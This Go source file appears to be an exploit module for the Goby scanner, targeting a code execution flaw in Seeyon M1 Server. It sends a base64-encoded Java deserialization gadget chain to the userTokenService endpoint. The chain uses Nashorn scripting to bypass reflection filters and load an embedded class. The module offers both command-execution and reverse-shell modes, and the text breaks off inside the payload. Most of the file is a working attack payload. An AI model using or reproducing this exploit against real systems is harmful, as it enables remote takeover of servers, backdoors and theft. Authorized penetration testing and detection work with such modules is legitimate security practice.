package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "seeyon M1 Server userTokenService Code Execution Vulnerability",
    "Description": "<p>Seeyon M1 Server is a mobile device.</p><p>Seeyon M1 Server userTokenService code execution vulnerability, attackers can arbitrarily execute code on the server side, write back door, obtain server permissions, and then control the entire web server.</p>",
    "Product": "SEEYON-M1-Mobile",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2023-02-01",
    "Author": "橘先生",
    "FofaQuery": "title==\"M1-Server 已启动\"",
    "GobyQuery": "title==\"M1-Server 已启动\"",
    "Level": "3",
    "Impact": "<p>Seeyon M1 Server userTokenService code execution vulnerability, attackers can arbitrarily execute code on the server side, write back door, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "致远 M1 移动端 userTokenService 代码执行漏洞",
            "Product": "致远互联-M1移动端",
            "Description": "<p>致远 M1 Server是一个移动服务。</p><p>致远 M1 Server userTokenService 代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>致远 M1 Server userTokenService 代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "seeyon M1 Server userTokenService Code Execution Vulnerability",
            "Product": "SEEYON-M1-Mobile",
            "Description": "<p>Seeyon M1 Server is a mobile device.</p><p>Seeyon M1 Server userTokenService code execution vulnerability, attackers can arbitrarily execute code on the server side, write back door, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Seeyon&nbsp;M1 Server userTokenService code execution vulnerability, attackers can arbitrarily execute code on the server side, write back door, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-12",
    "PocId": "7415"
}`
	sendPayload15645265 := func(hostInfo *httpclient.FixUrl, cmd string) string {
		cfg := httpclient.NewPostRequestConfig("/esn_mobile_pns/service/userTokenService")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("cmd", cmd)
		data, _ := base64.StdEncoding.DecodeString("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAHQAC25ld0luc3RhbmNldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAc3EAfgATdXEAfgAYAAAAAXQAAmpzdAAPZ2V0RW5naW5lQnlOYW1ldXEAfgAbAAAAAXZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHNxAH4AE3VxAH4AGAAAAAF0LWx0cnkgewogIGxvYWQoIm5hc2hvcm46bW96aWxsYV9jb21wYXQuanMiKTsKfSBjYXRjaCAoZSkge30KZnVuY3Rpb24gZ2V0VW5zYWZlKCl7CiAgdmFyIHRoZVVuc2FmZU1ldGhvZCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5VbnNhZmUiKS5nZXREZWNsYXJlZEZpZWxkKCd0aGVVbnNhZmUnKTsKICB0aGVVbnNhZmVNZXRob2Quc2V0QWNjZXNzaWJsZSh0cnVlKTsgCiAgcmV0dXJuIHRoZVVuc2FmZU1ldGhvZC5nZXQobnVsbCk7Cn0KZnVuY3Rpb24gcmVtb3ZlQ2xhc3NDYWNoZShjbGF6eil7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGF6ekFub255bW91c0NsYXNzID0gdW5zYWZlLmRlZmluZUFub255bW91c0NsYXNzKGNsYXp6LGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKS5nZXRSZXNvdXJjZUFzU3RyZWFtKCJDbGFzcy5jbGFzcyIpLnJlYWRBbGxCeXRlcygpLG51bGwpOwogIHZhciByZWZsZWN0aW9uRGF0YUZpZWxkID0gY2xhenpBbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJyZWZsZWN0aW9uRGF0YSIpOwogIHVuc2FmZS5wdXRPYmplY3QoY2xhenosdW5zYWZlLm9iamVjdEZpZWxkT2Zmc2V0KHJlZmxlY3Rpb25EYXRhRmllbGQpLG51bGwpOwp9CmZ1bmN0aW9uIGJ5cGFzc1JlZmxlY3Rpb25GaWx0ZXIoKSB7CiAgdmFyIHJlZmxlY3Rpb25DbGFzczsKICB0cnkgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImpkay5pbnRlcm5hbC5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9IGNhdGNoIChlcnJvcikgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGFzc0J1ZmZlciA9IHJlZmxlY3Rpb25DbGFzcy5nZXRSZXNvdXJjZUFzU3RyZWFtKCJSZWZsZWN0aW9uLmNsYXNzIikucmVhZEFsbEJ5dGVzKCk7CiAgdmFyIHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcyA9IHVuc2FmZS5kZWZpbmVBbm9ueW1vdXNDbGFzcyhyZWZsZWN0aW9uQ2xhc3MsIGNsYXNzQnVmZmVyLCBudWxsKTsKICB2YXIgZmllbGRGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJmaWVsZEZpbHRlck1hcCIpOwogIHZhciBtZXRob2RGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJtZXRob2RGaWx0ZXJNYXAiKTsKICBpZiAoZmllbGRGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQoZmllbGRGaWx0ZXJNYXBGaWVsZCksIGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpLmdldENvbnN0cnVjdG9yKCkubmV3SW5zdGFuY2UoKSk7CiAgfQogIGlmIChtZXRob2RGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQobWV0aG9kRmlsdGVyTWFwRmllbGQpLCBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKS5nZXRDb25zdHJ1Y3RvcigpLm5ld0luc3RhbmNlKCkpOwogIH0KICByZW1vdmVDbGFzc0NhY2hlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKSk7Cn0KZnVuY3Rpb24gc2V0QWNjZXNzaWJsZShhY2Nlc3NpYmxlT2JqZWN0KXsKICAgIHZhciB1bnNhZmUgPSBnZXRVbnNhZmUoKTsKICAgIHZhciBvdmVycmlkZUZpZWxkID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubGFuZy5yZWZsZWN0LkFjY2Vzc2libGVPYmplY3QiKS5nZXREZWNsYXJlZEZpZWxkKCJvdmVycmlkZSIpOwogICAgdmFyIG9mZnNldCA9IHVuc2FmZS5vYmplY3RGaWVsZE9mZnNldChvdmVycmlkZUZpZWxkKTsKICAgIHVuc2FmZS5wdXRCb29sZWFuKGFjY2Vzc2libGVPYmplY3QsIG9mZnNldCwgdHJ1ZSk7Cn0KZnVuY3Rpb24gZGVmaW5lQ2xhc3MoYnl0ZXMpewogIHZhciBjbHogPSBudWxsOwogIHZhciB2ZXJzaW9uID0gamF2YS5sYW5nLlN5c3RlbS5nZXRQcm9wZXJ0eSgiamF2YS52ZXJzaW9uIik7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpCiAgdmFyIGNsYXNzTG9hZGVyID0gbmV3IGphdmEubmV0LlVSTENsYXNzTG9hZGVyKGphdmEubGFuZy5yZWZsZWN0LkFycmF5Lm5ld0luc3RhbmNlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLm5ldC5VUkwiKSwgMCkpOwogIHRyeXsKICAgIGlmICh2ZXJzaW9uLnNwbGl0KCIuIilbMF0gPj0gMTEpIHsKICAgICAgYnlwYXNzUmVmbGVjdGlvbkZpbHRlcigpOwogICAgZGVmaW5lQ2xhc3NNZXRob2QgPSBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5sYW5nLkNsYXNzTG9hZGVyIikuZ2V0RGVjbGFyZWRNZXRob2QoImRlZmluZUNsYXNzIiwgamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoIltCIiksamF2YS5sYW5nLkludGVnZXIuVFlQRSwgamF2YS5sYW5nLkludGVnZXIuVFlQRSk7CiAgICBzZXRBY2Nlc3NpYmxlKGRlZmluZUNsYXNzTWV0aG9kKTsKICAgIC8vIOe7lei/hyBzZXRBY2Nlc3NpYmxlIAogICAgY2x6ID0gZGVmaW5lQ2xhc3NNZXRob2QuaW52b2tlKGNsYXNzTG9hZGVyLCBieXRlcywgMCwgYnl0ZXMubGVuZ3RoKTsKICAgIH1lbHNlewogICAgICB2YXIgcHJvdGVjdGlvbkRvbWFpbiA9IG5ldyBqYXZhLnNlY3VyaXR5LlByb3RlY3Rpb25Eb21haW4obmV3IGphdmEuc2VjdXJpdHkuQ29kZVNvdXJjZShudWxsLCBqYXZhLmxhbmcucmVmbGVjdC5BcnJheS5uZXdJbnN0YW5jZShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5zZWN1cml0eS5jZXJ0LkNlcnRpZmljYXRlIiksIDApKSwgbnVsbCwgY2xhc3NMb2FkZXIsIFtdKTsKICAgICAgY2x6ID0gdW5zYWZlLmRlZmluZUNsYXNzKG51bGwsIGJ5dGVzLCAwLCBieXRlcy5sZW5ndGgsIGNsYXNzTG9hZGVyLCBwcm90ZWN0aW9uRG9tYWluKTsKICAgIH0KICB9Y2F0Y2goZXJyb3IpewogICAgZXJyb3IucHJpbnRTdGFja1RyYWNlKCk7CiAgfWZpbmFsbHl7CiAgICByZXR1cm4gY2x6OwogIH0KfQpmdW5jdGlvbiBiYXNlNjREZWNvZGVUb0J5dGUoc3RyKSB7CiAgdmFyIGJ0OwogIHRyeSB7CiAgICBidCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIikubmV3SW5zdGFuY2UoKS5kZWNvZGVCdWZmZXIoc3RyKTsKICB9IGNhdGNoIChlKSB7CiAgICBidCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0IikubmV3SW5zdGFuY2UoKS5nZXREZWNvZGVyKCkuZGVjb2RlKHN0cik7CiAgfQogIHJldHVybiBidDsKfQp2YXIgY29kZT0ieXY2NnZnQUFBQzhCWndvQUlBQ1NCd0NUQndDVUNnQUNBSlVLQUFNQWxnb0FJZ0NYQ2dDWUFKa0tBSmdBbWdvQUlnQ2JDQUNjQ2dBZ0FKMEtBSjRBbndvQW5nQ2dCd0NoQ2dDWUFLSUlBSXdLQUNrQW93Z0FwQWdBcFFjQXBnZ0Fwd2dBcUFjQXFRb0FJQUNxQ0FDckNBQ3NCd0N0Q3dBYkFLNExBQnNBcndnQXNBZ0FzUWNBc2dvQUlBQ3pCd0MwQ2dDMUFMWUlBTGNKQUg0QXVBZ0F1UW9BZmdDNkNBQzdCd0M4Q2dCK0FMMEtBQ2tBdmdnQXZ3a0FMZ0RBQndEQkNnQXVBTUlJQU1NS0FINEF4QW9BSUFERkNBREdDUUIrQU1jSUFNZ0tBQ0FBeVFnQXlnY0F5d2dBekFnQXpRb0FtQURPQ2dEUEFNUUlBTkFLQUNrQTBRZ0EwZ29BS1FEVENBRFVDZ0FwQU5VS0FDa0ExZ2dBMXdvQUtRRFlDQURaQ2dBdUFOb0tBSDRBMndnQTNBb0FmZ0RkQ0FEZUNnRGZBT0FLQUNrQTRRZ0E0Z2dBNHdnQTVBY0E1UW9BVVFDWENnQlJBT1lJQU9jS0FGRUE2QWdBNlFnQTZnZ0E2d2dBN0FvQTdRRHVDZ0R0QU84SEFQQUtBUEVBOGdvQVhBRHpDQUQwQ2dCY0FQVUtBRndBOWdvQVhBRDNDZ0R4QVBnS0FQRUErUW9BT0FEb0NBRDZDZ0FwQUpZSUFQc0tBTzBBL0FjQS9Rb0FMZ0QrQ2dCcUFQOEtBR29BOGdvQThRRUFDZ0JxQVFBS0FHb0JBUW9CQWdFRENnRUNBUVFLQVFVQkJnb0JCUUVIQlFBQUFBQUFBQUF5Q2dDWUFRZ0tBUEVCQ1FvQWFnRUtDQUVMQ2dBNEFKVUlBUXdJQVEwSEFRNEJBQlpqYkdGemN5UnFZWFpoSkd4aGJtY2tVM1J5YVc1bkFRQVJUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQWxUZVc1MGFHVjBhV01CQUFkaGNuSmhlU1JDQVFBR1BHbHVhWFErQVFBREtDbFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFDa1Y0WTJWd2RHbHZibk1CQUFsc2IyRmtRMnhoYzNNQkFDVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFIWlhobFkzVjBaUUVBSmloTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUVaWGhsWXdFQUIzSmxkbVZ5YzJVQkFEa29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdUR3BoZG1FdmJHRnVaeTlKYm5SbFoyVnlPeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFaamJHRnpjeVFCQUFwVGIzVnlZMlZHYVd4bEFRQUhRVFF1YW1GMllRd0JEd0NKQVFBZ2FtRjJZUzlzWVc1bkwwTnNZWE56VG05MFJtOTFibVJGZUdObGNIUnBiMjRCQUI1cVlYWmhMMnhoYm1jdlRtOURiR0Z6YzBSbFprWnZkVzVrUlhKeWIzSU1BUkFCRVF3QWd3RVNEQUNEQUlRSEFSTU1BUlFCRlF3QkZnRVhEQUVZQVJrQkFBZDBhSEpsWVdSekRBRWFBUnNIQVJ3TUFSMEJIZ3dCSHdFZ0FRQVRXMHhxWVhaaEwyeGhibWN2VkdoeVpXRmtPd3dCSVFFUkRBRWlBU01CQUFSb2RIUndBUUFHZEdGeVoyVjBBUUFTYW1GMllTOXNZVzVuTDFKMWJtNWhZbXhsQVFBR2RHaHBjeVF3QVFBSGFHRnVaR3hsY2dFQUhtcGhkbUV2YkdGdVp5OU9iMU4xWTJoR2FXVnNaRVY0WTJWd2RHbHZiZ3dCSkFFWkFRQUdaMnh2WW1Gc0FRQUtjSEp2WTJWemMyOXljd0VBRG1waGRtRXZkWFJwYkM5TWFYTjBEQUVsQVNZTUFSOEJKd0VBQTNKbGNRRUFDMmRsZEZKbGMzQnZibk5sQVFBUGFtRjJZUzlzWVc1bkwwTnNZWE56REFFb0FTa0JBQkJxWVhaaEwyeGhibWN2VDJKcVpXTjBCd0VxREFFckFTd0JBQWxuWlhSSVpXRmtaWElNQUg4QWdBRUFFR3BoZG1FdWJHRnVaeTVUZEhKcGJtY01BSThBaVFFQUEyTnRaQUVBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNNQUlvQWl3d0JMUUV1QVFBSmMyVjBVM1JoZEhWekRBRXZBSUFCQUJGcVlYWmhMMnhoYm1jdlNXNTBaV2RsY2d3QWd3RXdBUUFrYjNKbkxtRndZV05vWlM1MGIyMWpZWFF1ZFhScGJDNWlkV1l1UW5sMFpVTm9kVzVyREFDSUFJa01BVEVCTWdFQUNITmxkRUo1ZEdWekRBQ0NBSUFCQUFKYlFnd0JNd0VwQVFBSFpHOVhjbWwwWlFFQUUycGhkbUV2YkdGdVp5OUZlR05sY0hScGIyNEJBQk5xWVhaaExtNXBieTVDZVhSbFFuVm1abVZ5QVFBRWQzSmhjQXdCTkFFMUJ3RTJBUUFBREFFM0FUZ0JBQkJqYjIxdFlXNWtJRzV2ZENCdWRXeHNEQUU1QVJFQkFBVWpJeU1qSXd3Qk9nRTdEQUU4QVQwQkFBRTZEQUUrQVQ4QkFDSmpiMjF0WVc1a0lISmxkbVZ5YzJVZ2FHOXpkQ0JtYjNKdFlYUWdaWEp5YjNJaERBRkFBVUVNQUkwQWpnRUFCVUJBUUVCQURBQ01BSXNCQUFkdmN5NXVZVzFsQndGQ0RBRkRBSXNNQVVRQkVRRUFBM2RwYmdFQUJIQnBibWNCQUFJdGJnRUFGbXBoZG1FdmJHRnVaeTlUZEhKcGJtZENkV1ptWlhJTUFVVUJSZ0VBQlNBdGJpQTBEQUZIQVJFQkFBSXZZd0VBQlNBdGRDQTBBUUFDYzJnQkFBSXRZd2NCU0F3QlNRRktEQUNNQVVzQkFCRnFZWFpoTDNWMGFXd3ZVMk5oYm01bGNnY0JUQXdCVFFGT0RBQ0RBVThCQUFKY1lRd0JVQUZSREFGU0FWTU1BVlFCRVF3QlZRRk9EQUZXQUlRQkFBY3ZZbWx1TDNOb0FRQUhZMjFrTG1WNFpRd0FqQUZYQVFBUGFtRjJZUzl1WlhRdlUyOWphMlYwREFGWUFTWU1BSU1CV1F3QldnRmJEQUZjQVZNSEFWME1BVjRCSmd3Qlh3RW1Cd0ZnREFGaEFUQU1BV0lBaEF3Qll3RmtEQUZsQVNZTUFXWUFoQUVBSFhKbGRtVnljMlVnWlhobFkzVjBaU0JsY25KdmNpd2diWE5uSUMwK0FRQUJJUUVBRTNKbGRtVnljMlVnWlhobFkzVjBaU0J2YXlFQkFBSkJOQUVBQjJadmNrNWhiV1VCQUFwblpYUk5aWE56WVdkbEFRQVVLQ2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUJVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tWWUJBQkJxWVhaaEwyeGhibWN2VkdoeVpXRmtBUUFOWTNWeWNtVnVkRlJvY21WaFpBRUFGQ2dwVEdwaGRtRXZiR0Z1Wnk5VWFISmxZV1E3QVFBT1oyVjBWR2h5WldGa1IzSnZkWEFCQUJrb0tVeHFZWFpoTDJ4aGJtY3ZWR2h5WldGa1IzSnZkWEE3QVFBSVoyVjBRMnhoYzNNQkFCTW9LVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFRWjJWMFJHVmpiR0Z5WldSR2FXVnNaQUVBTFNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwWnBaV3hrT3dFQUYycGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwWnBaV3hrQVFBTmMyVjBRV05qWlhOemFXSnNaUUVBQkNoYUtWWUJBQU5uWlhRQkFDWW9UR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQjJkbGRFNWhiV1VCQUFoamIyNTBZV2x1Y3dFQUd5aE1hbUYyWVM5c1lXNW5MME5vWVhKVFpYRjFaVzVqWlRzcFdnRUFEV2RsZEZOMWNHVnlZMnhoYzNNQkFBUnphWHBsQVFBREtDbEpBUUFWS0VrcFRHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQUpaMlYwVFdWMGFHOWtBUUJBS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzF0TWFtRjJZUzlzWVc1bkwwTnNZWE56T3lsTWFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlRXVjBhRzlrT3dFQUdHcGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwMWxkR2h2WkFFQUJtbHVkbTlyWlFFQU9TaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREdGJUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQ0dkbGRFSjVkR1Z6QVFBRUtDbGJRZ0VBQkZSWlVFVUJBQVFvU1NsV0FRQUxibVYzU1c1emRHRnVZMlVCQUJRb0tVeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME93RUFFV2RsZEVSbFkyeGhjbVZrVFdWMGFHOWtBUUFWWjJWMFEyOXVkR1Y0ZEVOc1lYTnpURzloWkdWeUFRQVpLQ2xNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU93RUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUJtVnhkV0ZzY3dFQUZTaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BXZ0VBQkhSeWFXMEJBQXB6ZEdGeWRITlhhWFJvQVFBVktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bGFBUUFIY21Wd2JHRmpaUUVBUkNoTWFtRjJZUzlzWVc1bkwwTm9ZWEpUWlhGMVpXNWpaVHRNYW1GMllTOXNZVzVuTDBOb1lYSlRaWEYxWlc1alpUc3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFGYzNCc2FYUUJBQ2NvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1Z0TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBZDJZV3gxWlU5bUFRQW5LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDBsdWRHVm5aWEk3QVFBUWFtRjJZUzlzWVc1bkwxTjVjM1JsYlFFQUMyZGxkRkJ5YjNCbGNuUjVBUUFMZEc5TWIzZGxja05oYzJVQkFBWmhjSEJsYm1RQkFDd29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZtWm1WeU93RUFDSFJ2VTNSeWFXNW5BUUFSYW1GMllTOXNZVzVuTDFKMWJuUnBiV1VCQUFwblpYUlNkVzUwYVcxbEFRQVZLQ2xNYW1GMllTOXNZVzVuTDFKMWJuUnBiV1U3QVFBb0tGdE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlRY205alpYTnpPd0VBRVdwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56QVFBT1oyVjBTVzV3ZFhSVGRISmxZVzBCQUJjb0tVeHFZWFpoTDJsdkwwbHVjSFYwVTNSeVpXRnRPd0VBR0NoTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc3BWZ0VBREhWelpVUmxiR2x0YVhSbGNnRUFKeWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUIyaGhjMDVsZUhRQkFBTW9LVm9CQUFSdVpYaDBBUUFPWjJWMFJYSnliM0pUZEhKbFlXMEJBQWRrWlhOMGNtOTVBUUFuS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwxQnliMk5sYzNNN0FRQUlhVzUwVm1Gc2RXVUJBQllvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3U1NsV0FRQVBaMlYwVDNWMGNIVjBVM1J5WldGdEFRQVlLQ2xNYW1GMllTOXBieTlQZFhSd2RYUlRkSEpsWVcwN0FRQUlhWE5EYkc5elpXUUJBQk5xWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0QVFBSllYWmhhV3hoWW14bEFRQUVjbVZoWkFFQUZHcGhkbUV2YVc4dlQzVjBjSFYwVTNSeVpXRnRBUUFGZDNKcGRHVUJBQVZtYkhWemFBRUFCWE5zWldWd0FRQUVLRW9wVmdFQUNXVjRhWFJXWVd4MVpRRUFCV05zYjNObEFDRUFmZ0FpQUFBQUFnQUlBSDhBZ0FBQkFJRUFBQUFBQUFnQWdnQ0FBQUVBZ1FBQUFBQUFCZ0FCQUlNQWhBQUNBSVVBQUFRUkFBZ0FFUU